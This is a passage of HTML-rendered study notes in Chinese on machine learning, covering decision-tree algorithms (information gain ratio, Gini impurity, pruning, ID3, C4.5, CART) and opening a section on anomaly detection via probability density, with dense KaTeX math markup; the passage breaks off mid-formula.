mtight\">∣</span></span></span></span><span style=\"top:-3.23em;\"><span class=\"pstrut\" style=\"height:3em;\"></span><span class=\"frac-line\" style=\"border-bottom-width:0.04em;\"></span></span><span style=\"top:-3.485em;\"><span class=\"pstrut\" style=\"height:3em;\"></span><span class=\"sizing reset-size6 size3 mtight\"><span class=\"mord mtight\"><span class=\"mord mtight\">∣</span><span class=\"mord mtight\"><span class=\"mord mathnormal mtight\" style=\"margin-right:0.02778em;\">D</span><span class=\"msupsub\"><span class=\"vlist-t vlist-t2\"><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.1645em;\"><span style=\"top:-2.357em;margin-left:-0.0278em;margin-right:0.0714em;\"><span class=\"pstrut\" style=\"height:2.5em;\"></span><span class=\"sizing reset-size3 size1 mtight\"><span class=\"mord mathnormal mtight\" style=\"margin-right:0.03588em;\">v</span></span></span></span><span class=\"vlist-s\">​</span></span><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.143em;\"><span></span></span></span></span></span></span><span class=\"mord mtight\">∣</span></span></span></span></span><span class=\"vlist-s\">​</span></span><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.52em;\"><span></span></span></span></span></span><span class=\"mclose nulldelimiter\"></span></span><span class=\"mord mathnormal\" style=\"margin-right:0.01968em;\">l</span><span class=\"mord mathnormal\">o</span><span class=\"mord\"><span class=\"mord mathnormal\" style=\"margin-right:0.03588em;\">g</span><span class=\"msupsub\"><span class=\"vlist-t vlist-t2\"><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.3011em;\"><span style=\"top:-2.55em;margin-left:-0.0359em;margin-right:0.05em;\"><span class=\"pstrut\" style=\"height:2.7em;\"></span><span class=\"sizing reset-size6 size3 mtight\"><span class=\"mord mtight\">2</span></span></span></span><span class=\"vlist-s\">​</span></span><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.15em;\"><span></span></span></span></span></span></span><span class=\"mord\"><span class=\"mopen nulldelimiter\"></span><span class=\"mfrac\"><span class=\"vlist-t vlist-t2\"><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:1.01em;\"><span style=\"top:-2.655em;\"><span class=\"pstrut\" style=\"height:3em;\"></span><span class=\"sizing reset-size6 size3 mtight\"><span class=\"mord mtight\"><span class=\"mord mtight\">∣</span><span class=\"mord mathnormal mtight\" style=\"margin-right:0.02778em;\">D</span><span class=\"mord mtight\">∣</span></span></span></span><span style=\"top:-3.23em;\"><span class=\"pstrut\" style=\"height:3em;\"></span><span class=\"frac-line\" style=\"border-bottom-width:0.04em;\"></span></span><span style=\"top:-3.485em;\"><span class=\"pstrut\" style=\"height:3em;\"></span><span class=\"sizing reset-size6 size3 mtight\"><span class=\"mord mtight\"><span class=\"mord mtight\">∣</span><span class=\"mord mtight\"><span class=\"mord mathnormal mtight\" style=\"margin-right:0.02778em;\">D</span><span class=\"msupsub\"><span class=\"vlist-t vlist-t2\"><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.1645em;\"><span style=\"top:-2.357em;margin-left:-0.0278em;margin-right:0.0714em;\"><span class=\"pstrut\" style=\"height:2.5em;\"></span><span class=\"sizing reset-size3 size1 mtight\"><span class=\"mord mathnormal mtight\" style=\"margin-right:0.03588em;\">v</span></span></span></span><span class=\"vlist-s\">​</span></span><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.143em;\"><span></span></span></span></span></span></span><span class=\"mord mtight\">∣</span></span></span></span></span><span class=\"vlist-s\">​</span></span><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.52em;\"><span></span></span></span></span></span><span class=\"mclose nulldelimiter\"></span></span></span></span></span><br />\n 其中，<span class=\"katex\"><span class=\"katex-mathml\"><math xmlns=\"http://www.w3.org/1998/Math/MathML\"><semantics><mrow><msub><mi>H</mi><mi>A</mi></msub><mo stretchy=\"false\">(</mo><mi>D</mi><mo stretchy=\"false\">)</mo></mrow><annotation encoding=\"application/x-tex\">H_{A}(D)</annotation></semantics></math></span><span class=\"katex-html\" aria-hidden=\"true\"><span class=\"base\"><span class=\"strut\" style=\"height:1em;vertical-align:-0.25em;\"></span><span class=\"mord\"><span class=\"mord mathnormal\" style=\"margin-right:0.08125em;\">H</span><span class=\"msupsub\"><span class=\"vlist-t vlist-t2\"><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.3283em;\"><span style=\"top:-2.55em;margin-left:-0.0813em;margin-right:0.05em;\"><span class=\"pstrut\" style=\"height:2.7em;\"></span><span class=\"sizing reset-size6 size3 mtight\"><span class=\"mord mtight\"><span class=\"mord mathnormal mtight\">A</span></span></span></span></span><span class=\"vlist-s\">​</span></span><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.15em;\"><span></span></span></span></span></span></span><span class=\"mopen\">(</span><span class=\"mord mathnormal\" style=\"margin-right:0.02778em;\">D</span><span class=\"mclose\">)</span></span></span></span> 为属性 A 的固有值（该属性在数据集中包含的信息量）。</p>\n</li>\n<li>\n<p><strong>基尼不纯度</strong>：数据集中随机抽取两个样本，它们属于不同类别的概率。</p>\n<p><span class=\"katex\"><span class=\"katex-mathml\"><math xmlns=\"http://www.w3.org/1998/Math/MathML\"><semantics><mrow><mi>G</mi><mi>i</mi><mi>n</mi><mi>i</mi><mo stretchy=\"false\">(</mo><mi>D</mi><mo stretchy=\"false\">)</mo><mo>=</mo><mn>1</mn><mo>−</mo><msubsup><mo>∑</mo><mrow><mi>i</mi><mo>=</mo><mn>1</mn></mrow><mi>k</mi></msubsup><mrow><mo stretchy=\"false\">(</mo><msub><mi>p</mi><mi>i</mi></msub><msup><mo stretchy=\"false\">)</mo><mn>2</mn></msup></mrow></mrow><annotation encoding=\"application/x-tex\">Gini(D)=1-\\sum_{i=1}^k{(p_i)^2}</annotation></semantics></math></span><span class=\"katex-html\" aria-hidden=\"true\"><span class=\"base\"><span class=\"strut\" style=\"height:1em;vertical-align:-0.25em;\"></span><span class=\"mord mathnormal\">G</span><span class=\"mord mathnormal\">ini</span><span class=\"mopen\">(</span><span class=\"mord mathnormal\" style=\"margin-right:0.02778em;\">D</span><span class=\"mclose\">)</span><span class=\"mspace\" style=\"margin-right:0.2778em;\"></span><span class=\"mrel\">=</span><span class=\"mspace\" style=\"margin-right:0.2778em;\"></span></span><span class=\"base\"><span class=\"strut\" style=\"height:0.7278em;vertical-align:-0.0833em;\"></span><span class=\"mord\">1</span><span class=\"mspace\" style=\"margin-right:0.2222em;\"></span><span class=\"mbin\">−</span><span class=\"mspace\" style=\"margin-right:0.2222em;\"></span></span><span class=\"base\"><span class=\"strut\" style=\"height:1.2887em;vertical-align:-0.2997em;\"></span><span class=\"mop\"><span class=\"mop op-symbol small-op\" style=\"position:relative;top:0em;\">∑</span><span class=\"msupsub\"><span class=\"vlist-t vlist-t2\"><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.989em;\"><span style=\"top:-2.4003em;margin-left:0em;margin-right:0.05em;\"><span class=\"pstrut\" style=\"height:2.7em;\"></span><span class=\"sizing reset-size6 size3 mtight\"><span class=\"mord mtight\"><span class=\"mord mathnormal mtight\">i</span><span class=\"mrel mtight\">=</span><span class=\"mord mtight\">1</span></span></span></span><span style=\"top:-3.2029em;margin-right:0.05em;\"><span class=\"pstrut\" style=\"height:2.7em;\"></span><span class=\"sizing reset-size6 size3 mtight\"><span class=\"mord mathnormal mtight\" style=\"margin-right:0.03148em;\">k</span></span></span></span><span class=\"vlist-s\">​</span></span><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.2997em;\"><span></span></span></span></span></span></span><span class=\"mspace\" style=\"margin-right:0.1667em;\"></span><span class=\"mord\"><span class=\"mopen\">(</span><span class=\"mord\"><span class=\"mord mathnormal\">p</span><span class=\"msupsub\"><span class=\"vlist-t vlist-t2\"><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.3117em;\"><span style=\"top:-2.55em;margin-left:0em;margin-right:0.05em;\"><span class=\"pstrut\" style=\"height:2.7em;\"></span><span class=\"sizing reset-size6 size3 mtight\"><span class=\"mord mathnormal mtight\">i</span></span></span></span><span class=\"vlist-s\">​</span></span><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.15em;\"><span></span></span></span></span></span></span><span class=\"mclose\"><span class=\"mclose\">)</span><span class=\"msupsub\"><span class=\"vlist-t\"><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.8141em;\"><span style=\"top:-3.063em;margin-right:0.05em;\"><span class=\"pstrut\" style=\"height:2.7em;\"></span><span class=\"sizing reset-size6 size3 mtight\"><span class=\"mord mtight\">2</span></span></span></span></span></span></span></span></span></span></span></span></p>\n<p>其中，<span class=\"katex\"><span class=\"katex-mathml\"><math xmlns=\"http://www.w3.org/1998/Math/MathML\"><semantics><mrow><msub><mi>p</mi><mi>i</mi></msub></mrow><annotation encoding=\"application/x-tex\">p_i</annotation></semantics></math></span><span class=\"katex-html\" aria-hidden=\"true\"><span class=\"base\"><span class=\"strut\" style=\"height:0.625em;vertical-align:-0.1944em;\"></span><span class=\"mord\"><span class=\"mord mathnormal\">p</span><span class=\"msupsub\"><span class=\"vlist-t vlist-t2\"><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.3117em;\"><span style=\"top:-2.55em;margin-left:0em;margin-right:0.05em;\"><span class=\"pstrut\" style=\"height:2.7em;\"></span><span class=\"sizing reset-size6 size3 mtight\"><span class=\"mord mathnormal mtight\">i</span></span></span></span><span class=\"vlist-s\">​</span></span><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.15em;\"><span></span></span></span></span></span></span></span></span></span> 是样本属于第 <span class=\"katex\"><span class=\"katex-mathml\"><math xmlns=\"http://www.w3.org/1998/Math/MathML\"><semantics><mrow><mi>i</mi></mrow><annotation encoding=\"application/x-tex\">i</annotation></semantics></math></span><span class=\"katex-html\" aria-hidden=\"true\"><span class=\"base\"><span class=\"strut\" style=\"height:0.6595em;\"></span><span class=\"mord mathnormal\">i</span></span></span></span> 类别的概率。</p>\n</li>\n</ul>\n<ol start=\"2\">\n<li>\n<p><strong>分割数据集</strong>：<br />\n根据所选属性的最佳分割点将当前节点下的样本划分为若干子集，并为每个子集生成新的分支节点。</p>\n</li>\n<li>\n<p><strong>递归建树</strong>：<br />\n对于每个新生成的子集节点，重复上述属性选择和分割的过程，直至达到停止条件（如所有样本属于同一类、没有剩余属性可分割或者达到预设的最大深度等）。</p>\n</li>\n<li>\n<p><strong>停止条件</strong>：<br />\n叶节点的最少样本数量 / 最大树深 / 叶节点的最大纯度<br />\n（这会导致某个叶节点中包含多类别的样本：取数量更多的作为叶节点的类别；若并列则随机选一个）</p>\n</li>\n<li>\n<p><strong>剪枝处理</strong>：<br />\n决策树容易过拟合，为了提高泛化能力，通常需要对生成的树进行剪枝操作，移除那些可能带来过拟合影响的复杂分支。<br />\n降低错误剪枝 REP / 悲观错误剪枝 PEP / 基于错误剪枝 EBP / 代价 - 复杂度剪枝 CCP / 最小错误剪枝 MEP</p>\n</li>\n<li>\n<p><strong>预测阶段</strong>：<br />\n构建完成的决策树可以用来预测未知数据的类别或连续值，只需将新数据沿树的路径向下传递，直到到达叶节点，该叶节点对应的类别或数值即为预测结果。</p>\n</li>\n</ol>\n<blockquote>\n<h2 id=\"id3\"><a class=\"anchor\" href=\"#id3\">#</a> ID3</h2>\n</blockquote>\n<ul>\n<li>\n<p>选择划分依据：<br />\n对于数据集 D 中的每一个属性 A, 计算其信息增益，并从中选择具有<strong>最大信息增益</strong>的属性作为当前节点的分割依据。</p>\n</li>\n<li>\n<p>生成分支节点：<br />\n根据所选的最佳属性及其各个可能取值，将数据集划分为多个子集。并为每个子集创建新的分支节点。</p>\n</li>\n<li>\n<p>生成叶节点：<br />\n当不能进一步划分时，以该节点下的实例最多的类别作为叶节点的类别标记。</p>\n</li>\n</ul>\n<blockquote>\n<h2 id=\"c45\"><a class=\"anchor\" href=\"#c45\">#</a> C4.5</h2>\n</blockquote>\n<ul>\n<li>选择划分依据：<br />\n信息增益率偏好可取值较少的属性 (分母越小，整体越大)，因此 C4.5 不是直接选取增益率最大的属性，而是使用一个<strong>启发式方法</strong>：<br />\n先从候选划分属性中找到信息增益高于平均值的属性，再从中选择增益率最高的。</li>\n<li>处理连续属性：<br />\n（ID3 只能处理离散属性，C4.5 引入了一种将连续属性离散化的方法）<br />\n假设 n 个样本的连续属性 A 有 m 个取值。先将其排序，并取相邻两样本值的中位点作为候选划分点（共 m-1 个），分别计算以候选划分点作为<strong>二元</strong>分类点（属性 A 上大于 / 不大于划分点的样本集合）时的信息增益，选择信息增益最大的点作为连续属性 A 的二元离散分类点</li>\n<li>缺失值处理：<br />\n（<strong>核心思想</strong>：降低缺失值所在样本的权重）\n<ol>\n<li>如何计算信息增益率？<br />\n无视缺失值，先计算剩余样本的信息增益，然后乘以 无缺失值样本所占比例。</li>\n<li>如果选择包含缺失值的属性作为节点，缺失值所在样本应该如何划分到子分支？<br />\n缺失值所在样本按照 无缺失值样本在每个子分支中所占的比例，划分到所有分支中。</li>\n</ol>\n</li>\n</ul>\n<blockquote>\n<h2 id=\"cart\"><a class=\"anchor\" href=\"#cart\">#</a> CART</h2>\n</blockquote>\n<ul>\n<li>既能处理<strong>分类</strong>问题，也能处理<strong>回归</strong>问题</li>\n<li>选择划分依据：<br />\n划分依据为<strong>某个属性是否等于某个取值</strong>。<br />\n计算每个属性每种取值条件下的基尼不纯度 <span class=\"katex\"><span class=\"katex-mathml\"><math xmlns=\"http://www.w3.org/1998/Math/MathML\"><semantics><mrow><mi>G</mi><mi>i</mi><mi>n</mi><mi>i</mi><mo stretchy=\"false\">(</mo><msub><mi>D</mi><mi>a</mi></msub><mo stretchy=\"false\">)</mo></mrow><annotation encoding=\"application/x-tex\">Gini(D_a)</annotation></semantics></math></span><span class=\"katex-html\" aria-hidden=\"true\"><span class=\"base\"><span class=\"strut\" style=\"height:1em;vertical-align:-0.25em;\"></span><span class=\"mord mathnormal\">G</span><span class=\"mord mathnormal\">ini</span><span class=\"mopen\">(</span><span class=\"mord\"><span class=\"mord mathnormal\" style=\"margin-right:0.02778em;\">D</span><span class=\"msupsub\"><span class=\"vlist-t vlist-t2\"><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.1514em;\"><span style=\"top:-2.55em;margin-left:-0.0278em;margin-right:0.05em;\"><span class=\"pstrut\" style=\"height:2.7em;\"></span><span class=\"sizing reset-size6 size3 mtight\"><span class=\"mord mathnormal mtight\">a</span></span></span></span><span class=\"vlist-s\">​</span></span><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.15em;\"><span></span></span></span></span></span></span><span class=\"mclose\">)</span></span></span></span>，其中 <span class=\"katex\"><span class=\"katex-mathml\"><math xmlns=\"http://www.w3.org/1998/Math/MathML\"><semantics><mrow><msub><mi>D</mi><mi>a</mi></msub></mrow><annotation encoding=\"application/x-tex\">D_a</annotation></semantics></math></span><span class=\"katex-html\" aria-hidden=\"true\"><span class=\"base\"><span class=\"strut\" style=\"height:0.8333em;vertical-align:-0.15em;\"></span><span class=\"mord\"><span class=\"mord mathnormal\" style=\"margin-right:0.02778em;\">D</span><span class=\"msupsub\"><span class=\"vlist-t vlist-t2\"><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.1514em;\"><span style=\"top:-2.55em;margin-left:-0.0278em;margin-right:0.05em;\"><span class=\"pstrut\" style=\"height:2.7em;\"></span><span class=\"sizing reset-size6 size3 mtight\"><span class=\"mord mathnormal mtight\">a</span></span></span></span><span class=\"vlist-s\">​</span></span><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.15em;\"><span></span></span></span></span></span></span></span></span></span> 表示数据集中属性 <span class=\"katex\"><span class=\"katex-mathml\"><math xmlns=\"http://www.w3.org/1998/Math/MathML\"><semantics><mrow><mi>A</mi></mrow><annotation encoding=\"application/x-tex\">A</annotation></semantics></math></span><span class=\"katex-html\" aria-hidden=\"true\"><span class=\"base\"><span class=\"strut\" style=\"height:0.6833em;\"></span><span class=\"mord mathnormal\">A</span></span></span></span> 取值 <span class=\"katex\"><span class=\"katex-mathml\"><math xmlns=\"http://www.w3.org/1998/Math/MathML\"><semantics><mrow><mi>a</mi></mrow><annotation encoding=\"application/x-tex\">a</annotation></semantics></math></span><span class=\"katex-html\" aria-hidden=\"true\"><span class=\"base\"><span class=\"strut\" style=\"height:0.4306em;\"></span><span class=\"mord mathnormal\">a</span></span></span></span> 下的数据子集，<br />\n选取基尼不纯度最小的取值作为节点的划分依据。</li>\n<li>CART 生成的决策树是<strong>二叉树</strong>，每个非叶子节点有且仅有两个子节点。<br />\n对于数据集 <span class=\"katex\"><span class=\"katex-mathml\"><math xmlns=\"http://www.w3.org/1998/Math/MathML\"><semantics><mrow><mi>D</mi></mrow><annotation encoding=\"application/x-tex\">D</annotation></semantics></math></span><span class=\"katex-html\" aria-hidden=\"true\"><span class=\"base\"><span class=\"strut\" style=\"height:0.6833em;\"></span><span class=\"mord mathnormal\" style=\"margin-right:0.02778em;\">D</span></span></span></span>，个数为 <span class=\"katex\"><span class=\"katex-mathml\"><math xmlns=\"http://www.w3.org/1998/Math/MathML\"><semantics><mrow><mi mathvariant=\"normal\">∣</mi><mi>D</mi><mi mathvariant=\"normal\">∣</mi></mrow><annotation encoding=\"application/x-tex\">|D|</annotation></semantics></math></span><span class=\"katex-html\" aria-hidden=\"true\"><span class=\"base\"><span class=\"strut\" style=\"height:1em;vertical-align:-0.25em;\"></span><span class=\"mord\">∣</span><span class=\"mord mathnormal\" style=\"margin-right:0.02778em;\">D</span><span class=\"mord\">∣</span></span></span></span>，根据属性 <span class=\"katex\"><span class=\"katex-mathml\"><math xmlns=\"http://www.w3.org/1998/Math/MathML\"><semantics><mrow><mi>A</mi></mrow><annotation encoding=\"application/x-tex\">A</annotation></semantics></math></span><span class=\"katex-html\" aria-hidden=\"true\"><span class=\"base\"><span class=\"strut\" style=\"height:0.6833em;\"></span><span class=\"mord mathnormal\">A</span></span></span></span> 是否取某一可能值 <span class=\"katex\"><span class=\"katex-mathml\"><math xmlns=\"http://www.w3.org/1998/Math/MathML\"><semantics><mrow><mi>a</mi></mrow><annotation encoding=\"application/x-tex\">a</annotation></semantics></math></span><span class=\"katex-html\" aria-hidden=\"true\"><span class=\"base\"><span class=\"strut\" style=\"height:0.4306em;\"></span><span class=\"mord mathnormal\">a</span></span></span></span>，把数据集 <span class=\"katex\"><span class=\"katex-mathml\"><math xmlns=\"http://www.w3.org/1998/Math/MathML\"><semantics><mrow><mi>D</mi></mrow><annotation encoding=\"application/x-tex\">D</annotation></semantics></math></span><span class=\"katex-html\" aria-hidden=\"true\"><span class=\"base\"><span class=\"strut\" style=\"height:0.6833em;\"></span><span class=\"mord mathnormal\" style=\"margin-right:0.02778em;\">D</span></span></span></span> 分成两部分 <span class=\"katex\"><span class=\"katex-mathml\"><math xmlns=\"http://www.w3.org/1998/Math/MathML\"><semantics><mrow><msub><mi>D</mi><mn>1</mn></msub></mrow><annotation encoding=\"application/x-tex\">D_1</annotation></semantics></math></span><span class=\"katex-html\" aria-hidden=\"true\"><span class=\"base\"><span class=\"strut\" style=\"height:0.8333em;vertical-align:-0.15em;\"></span><span class=\"mord\"><span class=\"mord mathnormal\" style=\"margin-right:0.02778em;\">D</span><span class=\"msupsub\"><span class=\"vlist-t vlist-t2\"><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.3011em;\"><span style=\"top:-2.55em;margin-left:-0.0278em;margin-right:0.05em;\"><span class=\"pstrut\" style=\"height:2.7em;\"></span><span class=\"sizing reset-size6 size3 mtight\"><span class=\"mord mtight\">1</span></span></span></span><span class=\"vlist-s\">​</span></span><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.15em;\"><span></span></span></span></span></span></span></span></span></span> 和 <span class=\"katex\"><span class=\"katex-mathml\"><math xmlns=\"http://www.w3.org/1998/Math/MathML\"><semantics><mrow><msub><mi>D</mi><mn>2</mn></msub></mrow><annotation encoding=\"application/x-tex\">D_2</annotation></semantics></math></span><span class=\"katex-html\" aria-hidden=\"true\"><span class=\"base\"><span class=\"strut\" style=\"height:0.8333em;vertical-align:-0.15em;\"></span><span class=\"mord\"><span class=\"mord mathnormal\" style=\"margin-right:0.02778em;\">D</span><span class=\"msupsub\"><span class=\"vlist-t vlist-t2\"><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.3011em;\"><span style=\"top:-2.55em;margin-left:-0.0278em;margin-right:0.05em;\"><span class=\"pstrut\" style=\"height:2.7em;\"></span><span class=\"sizing reset-size6 size3 mtight\"><span class=\"mord mtight\">2</span></span></span></span><span class=\"vlist-s\">​</span></span><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.15em;\"><span></span></span></span></span></span></span></span></span></span>，分别表示 取 / 不取 <span class=\"katex\"><span class=\"katex-mathml\"><math xmlns=\"http://www.w3.org/1998/Math/MathML\"><semantics><mrow><mi>a</mi></mrow><annotation encoding=\"application/x-tex\">a</annotation></semantics></math></span><span class=\"katex-html\" aria-hidden=\"true\"><span class=\"base\"><span class=\"strut\" style=\"height:0.4306em;\"></span><span class=\"mord mathnormal\">a</span></span></span></span>。</li>\n</ul>\n<h1 id=\"异常检测\"><a class=\"anchor\" href=\"#异常检测\">#</a> 异常检测</h1>\n<p>（Anomaly Detection）</p>\n<p>根据输入的数据，对不符合预期模式的数据进行识别。</p>\n<blockquote>\n<p>异常检测 =&gt; 寻找异常点 =&gt; <mark>寻找概率密度值较小的点</mark></p>\n</blockquote>\n<p><strong>概率密度</strong>：</p>\n<ol>\n<li>用于表示<strong>连续型随机变量</strong>的概率分布</li>\n<li>概率密度函数 <span class=\"katex\"><span class=\"katex-mathml\"><math xmlns=\"http://www.w3.org/1998/Math/MathML\"><semantics><mrow><mi>p</mi><mo stretchy=\"false\">(</mo><mi>x</mi><mo stretchy=\"false\">)</mo></mrow><annotation encoding=\"application/x-tex\">p(x)</annotation></semantics></math></span><span class=\"katex-html\" aria-hidden=\"true\"><span class=\"base\"><span class=\"strut\" style=\"height:1em;vertical-align:-0.25em;\"></span><span class=\"mord mathnormal\">p</span><span class=\"mopen\">(</span><span class=\"mord mathnormal\">x</span><span class=\"mclose\">)</span></span></span></span> 是一个描述随机变量在某个确定的取值点 <span class=\"katex\"><span class=\"katex-mathml\"><math xmlns=\"http://www.w3.org/1998/Math/MathML\"><semantics><mrow><mi>x</mi></mrow><annotation encoding=\"application/x-tex\">x</annotation></semantics></math></span><span class=\"katex-html\" aria-hidden=\"true\"><span class=\"base\"><span class=\"strut\" style=\"height:0.4306em;\"></span><span class=\"mord mathnormal\">x</span></span></span></span> 附近的可能性的函数</li>\n<li>区间 <span class=\"katex\"><span class=\"katex-mathml\"><math xmlns=\"http://www.w3.org/1998/Math/MathML\"><semantics><mrow><mo stretchy=\"false\">(</mo><msub><mi>x</mi><mn>1</mn></msub><mo separator=\"true\">,</mo><msub><mi>x</mi><mn>2</mn></msub><mo stretchy=\"false\">)</mo></mrow><annotation encoding=\"application/x-tex\">(x_1,x_2)</annotation></semantics></math></span><span class=\"katex-html\" aria-hidden=\"true\"><span class=\"base\"><span class=\"strut\" style=\"height:1em;vertical-align:-0.25em;\"></span><span class=\"mopen\">(</span><span class=\"mord\"><span class=\"mord mathnormal\">x</span><span class=\"msupsub\"><span class=\"vlist-t vlist-t2\"><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.3011em;\"><span style=\"top:-2.55em;margin-left:0em;margin-right:0.05em;\"><span class=\"pstrut\" style=\"height:2.7em;\"></span><span class=\"sizing reset-size6 size3 mtight\"><span class=\"mord mtight\">1</span></span></span></span><span class=\"vlist-s\">​</span></span><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.15em;\"><span></span></span></span></span></span></span><span class=\"mpunct\">,</span><span class=\"mspace\" style=\"margin-right:0.1667em;\"></span><span class=\"mord\"><span class=\"mord mathnormal\">x</span><span class=\"msupsub\"><span class=\"vlist-t vlist-t2\"><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.3011em;\"><span style=\"top:-2.55em;margin-left:0em;margin-right:0.05em;\"><span class=\"pstrut\" style=\"height:2.7em;\"></span><span class=\"sizing reset-size6 size3 mtight\"><span class=\"mord mtight\">2</span></span></span></span><span class=\"vlist-s\">​</span></span><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.15em;\"><span></span></span></span></span></span></span><span class=\"mclose\">)</span></span></span></span> 的概率为 <span class=\"katex\"><span class=\"katex-mathml\"><math xmlns=\"http://www.w3.org/1998/Math/MathML\"><semantics><mrow><mi>P</mi><mo stretchy=\"false\">(</mo><msub><mi>x</mi><mn>1</mn></msub><mo separator=\"true\">,</mo><msub><mi>x</mi><mn>2</mn></msub><mo stretchy=\"false\">)</mo><mo>=</mo><msubsup><mo>∫</mo><msub><mi>x</mi><mn>1</mn></msub><msub><mi>x</mi><mn>2</mn></msub></msubsup><mi>p</mi><mo stretchy=\"false\">(</mo><mi>x</mi><mo stretchy=\"false\">)</mo><mi>d</mi><mi>x</mi></mrow><annotation encoding=\"application/x-tex\">P(x_1,x_2)=\\int_{x_1}^{x_2}p(x)dx</annotation></semantics></math></span><span class=\"katex-html\" aria-hidden=\"true\"><span class=\"base\"><span class=\"strut\" style=\"height:1em;vertical-align:-0.25em;\"></span><span class=\"mord mathnormal\" style=\"margin-right:0.13889em;\">P</span><span class=\"mopen\">(</span><span class=\"mord\"><span class=\"mord mathnormal\">x</span><span class=\"msupsub\"><span class=\"vlist-t vlist-t2\"><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.3011em;\"><span style=\"top:-2.55em;margin-left:0em;margin-right:0.05em;\"><span class=\"pstrut\" style=\"height:2.7em;\"></span><span class=\"sizing reset-size6 size3 mtight\"><span class=\"mord mtight\">1</span></span></span></span><span class=\"vlist-s\">​</span></span><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.15em;\"><span></span></span></span></span></span></span><span class=\"mpunct\">,</span><span class=\"mspace\" style=\"margin-right:0.1667em;\"></span><span class=\"mord\"><span class=\"mord mathnormal\">x</span><span class=\"msupsub\"><span class=\"vlist-t vlist-t2\"><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.3011em;\"><span style=\"top:-2.55em;margin-left:0em;margin-right:0.05em;\"><span class=\"pstrut\" style=\"height:2.7em;\"></span><span class=\"sizing reset-size6 size3 mtight\"><span class=\"mord mtight\">2</span></span></span></span><span class=\"vlist-s\">​</span></span><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.15em;\"><span></span></span></span></span></span></span><span class=\"mclose\">)</span><span class=\"mspace\" style=\"margin-right:0.2778em;\"></span><span class=\"mrel\">=</span><span class=\"mspace\" style=\"margin-right:0.2778em;\"></span></span><span class=\"base\"><span class=\"strut\" style=\"height:1.3152em;vertical-align:-0.4559em;\"></span><span class=\"mop\"><span class=\"mop op-symbol small-op\" style=\"margin-right:0.19445em;position:relative;top:-0.0006em;\">∫</span><span class=\"msupsub\"><span class=\"vlist-t vlist-t2\"><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.8593em;\"><span style=\"top:-2.3442em;margin-left:-0.1945em;margin-right:0.05em;\"><span class=\"pstrut\" style=\"height:2.7em;\"></span><span class=\"sizing reset-size6 size3 mtight\"><span class=\"mord mtight\"><span class=\"mord mtight\"><span class=\"mord mathnormal mtight\">x</span><span class=\"msupsub\"><span class=\"vlist-t vlist-t2\"><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.3173em;\"><span style=\"top:-2.357em;margin-left:0em;margin-right:0.0714em;\"><span class=\"pstrut\" style=\"height:2.5em;\"></span><span class=\"sizing reset-size3 size1 mtight\"><span class=\"mord mtight\">1</span></span></span></span><span class=\"vlist-s\">​</span></span><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.143em;\"><span></span></span></span></span></span></span></span></span></span><span style=\"top:-3.2579em;margin-right:0.05em;\"><span class=\"pstrut\" style=\"height:2.7em;\"></span><span class=\"sizing reset-size6 size3 mtight\"><span class=\"mord mtight\"><span class=\"mord mtight\"><span class=\"mord mathnormal mtight\">x</span><span class=\"msupsub\"><span class=\"vlist-t vlist-t2\"><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.3173em;\"><span style=\"top:-2.357em;margin-left:0em;margin-right:0.0714em;\"><span class=\"pstrut\" style=\"height:2.5em;\"></span><span class=\"sizing reset-size3 size1 mtight\"><span class=\"mord mtight\">2</span></span></span></span><span class=\"vlist-s\">​</span></span><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.143em;\"><span></span></span></span></span></span></span></span></span></span></span><span class=\"vlist-s\">​</span></span><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.4559em;\"><span></span></span></span></span></span></span><span class=\"mspace\" style=\"margin-right:0.1667em;\"></span><span class=\"mord mathnormal\">p</span><span class=\"mopen\">(</span><span class=\"mord mathnormal\">x</span><span class=\"mclose\">)</span><span class=\"mord mathnormal\">d</span><span class=\"mord mathnormal\">x</span></span></span></span><br />\n 从 <span class=\"katex\"><span class=\"katex-mathml\"><math xmlns=\"http://www.w3.org/1998/Math/MathML\"><semantics><mrow><mo>−</mo><mi mathvariant=\"normal\">∞</mi></mrow><annotation encoding=\"application/x-tex\">-\\infty</annotation></semantics></math></span><span class=\"katex-html\" aria-hidden=\"true\"><span class=\"base\"><span class=\"strut\" style=\"height:0.6667em;vertical-align:-0.0833em;\"></span><span class=\"mord\">−</span><span class=\"mord\">∞</span></span></span></span> 到 <span class=\"katex\"><span class=\"katex-mathml\"><math xmlns=\"http://www.w3.org/1998/Math/MathML\"><semantics><mrow><mo>+</mo><mi mathvariant=\"normal\">∞</mi></mrow><annotation 